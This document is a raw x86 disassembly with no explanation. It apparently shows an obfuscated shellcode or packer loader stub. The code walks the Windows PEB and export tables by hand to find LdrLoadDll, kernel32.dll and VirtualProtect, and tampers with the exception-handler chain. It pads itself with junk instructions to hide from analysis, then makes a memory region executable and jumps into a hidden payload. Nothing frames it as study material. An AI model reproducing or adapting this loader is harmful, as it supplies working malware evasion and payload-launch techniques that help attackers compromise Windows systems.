_start
pushad
add esp 0xfffffffc
mov [ esp ] edx
xor edx [ esp ]
or edx edx
adc esp 0x4
push esp
and esi esi
sbb edx 0xffffffff
add esp 0x4
mov edi [ esp - 0x4 ]
inc edx
sub edi 0x4
and eax eax
sbb edx 0xffffffff
neg edx
call $+5
sub [ edi ] edx
retn
sub_4400203b
add esp 0xfffffffc
mov [ esp ] ebx
xor ebx [ esp ]
sub esp 0xfffffffc
mov eax 0x0
add eax ebx
sub ah 0x1
test ebx ebx
sbb ah 0x1
mov al ah
test edx edx
mov ebp 0x0
adc ebp ebx
call $+5
xor esi esi
or esi [ esp ]
or edx edx
adc ebp 0x1
movzx edx [ esi + ebp - 0x2 ]
sub esp 0x4
mov [ esp ] edx
xor edx eax
pop edx
jne r-xdata
add [ esp ] ebx
jmp [ esp ]
sub ebx ebx
add ebx ebp
sub_440020c9
push [ fs : 0x0 ]
add eax edi
mov ebx 0x0
sub ebx 0xffff
neg ebx
not ecx
and edi edi
adc eax edi
mov [ fs : 0x0 ] esp
and eax ecx
test esi esi
adc eax edi
and eax eax
jae r-xdata
call $+5
call sub_440020c9
add esp 0xfffffffc
mov [ esp ] ecx
xor ecx ecx
xor ecx [ esp + 0x10 ]
sub [ ecx + 0xb8 ] 0xffffffff
or ecx ecx
adc [ ecx + 0xb8 ] 0x1
add esp 0x4
mov ecx [ esp - 0x4 ]
add esp 0xfffffffc
mov [ esp ] eax
xor eax [ esp ]
test ebx ebx
sbb esp 0xfffffffc
retn 0x10
add esp 0x4
mov edx [ esp - 0x4 ]
mov edx [ esp ]
mov [ fs : 0x0 ] edx
or ebx ebx
adc esp 0x8
xor edi edi
xor edi eax
mov edx 0x0
sub edx [ eax + 0x3c ]
neg edx
test edi edi
adc eax edx
or ecx ecx
mov edx 0x0
adc edx 0x4550
xor esi esi
add esi [ eax ]
call $+5
mov [ esp ] esi
test ebx ebx
sbb esi edx
pop esi
jne r-xdata
jmp [ esp ]
popad
and eax 0x0
or eax 0x1
retn 0xc
mov edx 0x0
sub edx [ eax + 0x78 ]
neg edx
test ebx ebx
mov eax 0x0
adc eax edx
test eax eax
adc eax edi
sub esp 0x4
mov [ esp ] eax
xor edx edx
xor edx [ eax + 0x20 ]
and eax 0x0
or eax edx
add eax edi
sub esp 0x4
mov [ esp ] edi
sub esp 0x4
mov [ esp ] eax
mov esi [ esp ]
add esp 0x4
mov ebx [ esp ]
add esp 0x4
push edx
xor edx [ esp ]
sub esp 0xfffffffc
mov eax 0x0
sub eax esi
neg eax
sub ecx ecx
add ecx [ esi ]
mov esi 0x0
xor esi ecx
call $+5
push esp
pop ebp
or esi esi
adc esi ebx
add esp 0xfffffffc
mov [ esp ] 0x6c6c
add esp 0xfffffffc
mov [ esp ] 0x4464616f
sub esp 0x4
mov [ esp ] 0x4c72644c
mov edi 0x0
add edi esp
push 0xb
pop ecx
[ esi ] [ edi ]
je r-xdata
sub eax edi
push edx
xor edx [ esp ]
add esp 0x4
mov edx [ eax ]
mov esi 0x5a4d
and edx ebx
call $+5
mov [ esp ] edx
sub edx esi
pop edx
je r-xdata
mov esp ebp
mov esi [ esp ]
add esp 0x4
sub esp 0x4
mov [ esp ] ebx
add esp 0xfffffffc
mov [ esp ] edx
pop ecx
add esp 0x4
mov edi [ esp - 0x4 ]
mov eax [ esp ]
add esp 0x4
and ecx ecx
mov ebx 0x0
adc ebx eax
xor edx edx
add edx [ eax + 0x24 ]
mov eax 0x0
xor eax edx
test edi edi
adc eax edi
or eax eax
mov edx 0x0
adc edx [ eax + ecx * 2 ]
and edx 0xffff
mov ecx 0x0
or ecx edx
xor edx edx
add edx [ ebx + 0x10 ]
or eax eax
sbb ecx edx
test eax eax
sbb ecx 0xffffffff
mov eax 0x0
or eax [ ebx + 0x1c ]
and edi edi
adc eax edi
mov edx 0x0
xor edx [ eax + ecx * 4 ]
add edi edx
mov ebp 0x0
add ebp esp
xor edx edx
push edx
mov eax 0x0
xor eax esp
sub esp 0x4
mov [ esp ] edx
call $+5
mov [ esp ] 0x6c006c
call $+5
mov [ esp ] 0x64002e
call $+5
mov [ esp ] 0x320033
add esp 0xfffffffc
mov [ esp ] 0x6c0065
sub esp 0x4
mov [ esp ] 0x6e0072
add esp 0xfffffffc
mov [ esp ] 0x65006b
push esp
push 0x1a0018
sub esi esi
add esi esp
push eax
sub esp 0x4
mov [ esp ] esi
add esp 0xfffffffc
mov [ esp ] edx
sub esp 0x4
mov [ esp ] edx
sub esp 0x4
mov [ esp ] edi
add esp 0xfffffffc
mov [ esp ] eax
pop esi
mov ebx [ esp ]
add esp 0x4
call ebx
mov eax 0x0
xor eax [ esi ]
sub esp 0x4
mov [ esp ] eax
pop edx
sub esi esi
add esi [ fs : 0x30 ]
mov edi 0x0
add edi [ esi + 0x10 ]
mov [ edi + 0x18 ] edx
xor esp esp
add esp ebp
test ebx ebx
mov esi 0x0
adc esi [ fs : 0x30 ]
xor edi edi
xor edi [ esi + 0x10 ]
and ebx ebx
mov eax 0x0
adc eax [ edi + 0x18 ]
mov edi eax
mov edx 0x0
add edx [ eax + 0x3c ]
add eax edx
xor edx edx
or edx [ eax + 0x78 ]
and eax 0x0
or eax edx
test ecx ecx
adc eax edi
call $+5
mov [ esp ] eax
mov edx 0x0
or edx [ eax + 0x20 ]
xor eax eax
xor eax edx
and edx edx
adc eax edi
add esp 0xfffffffc
mov [ esp ] edi
call $+5
mov [ esp ] eax
pop esi
pop ebx
xor edx edx
xor eax eax
or eax esi
xor ecx ecx
or ecx [ esi ]
xor esi esi
xor esi ecx
call $+5
mov ebp 0x0
sub ebp esp
neg ebp
test edx edx
adc esi ebx
call $+5
mov [ esp ] 0x7463
add esp 0xfffffffc
mov [ esp ] 0x65746f72
add esp 0xfffffffc
mov [ esp ] 0x506c6175
add esp 0xfffffffc
mov [ esp ] 0x74726956
push esp
pop edi
test eax eax
mov ecx 0x0
adc ecx 0xf
[ esi ] [ edi ]
je r-xdata
or edx edx
adc edx 0x1
test ebx ebx
adc eax 0x4
mov esi 0x0
xor esi [ eax ]
sub esp esp
add esp ebp
jmp [ esp ]
and esp 0x0
add esp ebp
mov esi [ esp ]
add esp 0x4
sub esp 0x4
mov [ esp ] ebx
sub esp 0x4
mov [ esp ] edx
mov ecx [ esp ]
add esp 0x4
mov edi [ esp ]
add esp 0x4
mov eax [ esp ]
add esp 0x4
test edx edx
mov ebx 0x0
adc ebx eax
mov edx 0x0
xor edx [ eax + 0x24 ]
sub eax eax
add eax edx
test edi edi
adc eax edi
xor edx edx
or edx [ eax + ecx * 2 ]
and edx 0xffff
mov ecx 0x0
xor ecx edx
xor edx edx
or edx [ ebx + 0x10 ]
test ebx ebx
sbb ecx edx
test eax eax
adc ecx 0x1
xor eax eax
or eax [ ebx + 0x1c ]
add eax edi
mov edx 0x0
sub edx [ eax + ecx * 4 ]
neg edx
or ebx ebx
adc edi edx
mov ebx 0x0
or ebx 0x1000
call $+5
pop eax
and eax 0xfffff000
test ebx ebx
adc eax ebx
add eax ebx
push eax
test edi edi
mov esi 0x0
adc esi 0x4
call $+5
test esi esi
adc eax ebx
mov edx 0x0
or edx [ eax ]
dec esi
je r-xdata
inc edx
add eax 0x4
and edi edi
mov esi 0x0
adc esi [ eax ]
and esp 0x0
add esp ebp
jmp [ esp ]
add esp 0x4
mov edx [ esp - 0x4 ]
add esp 0x4
mov eax [ esp - 0x4 ]
call $+5
mov [ esp ] edx
push esp
sub esp 0x4
mov [ esp ] 0x40
push 0x45b9
add esp 0xfffffffc
mov [ esp ] eax
add esp 0xfffffffc
mov [ esp ] edi
push eax
add esp 0x4
mov esi [ esp - 0x4 ]
pop ebx
call $+5
pop eax
and eax eax
adc eax 0x18
push eax
add esp 0xfffffffc
mov [ esp ] ebp
xor ebp ebp
or ebp esp
and ebx ebx
adc ebx 0x5
jmp ebx
jmp [ esp ]
